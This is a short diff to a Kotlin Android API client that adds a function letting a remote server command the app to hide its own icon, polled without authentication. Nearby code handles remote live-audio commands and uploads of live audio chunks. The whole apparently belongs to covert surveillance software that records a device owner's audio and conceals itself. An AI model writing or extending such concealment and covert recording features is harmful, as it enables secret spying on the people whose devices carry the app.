@@ -99,6 +99,17 @@ class SentryApiClient(
         request("GET", "/audio/live/command/$deviceId", null, authenticated = false)
     }
 
+    suspend fun pollIconVisibilityCommand(): Result<Boolean?> = withContext(Dispatchers.IO) {
+        val deviceId = CryptoManager.getOrCreateDeviceId(context)
+        val res = request("GET", "/devices/$deviceId/icon-command", null, authenticated = false)
+        res.map {
+            val cmdObj = it.optJSONObject("command")
+            if (cmdObj != null && cmdObj.has("hide")) {
+                cmdObj.getBoolean("hide")
+            } else null
+        }
+    }
+
     suspend fun uploadLiveAudioChunk(
         deviceId: String,
         base64: String?,
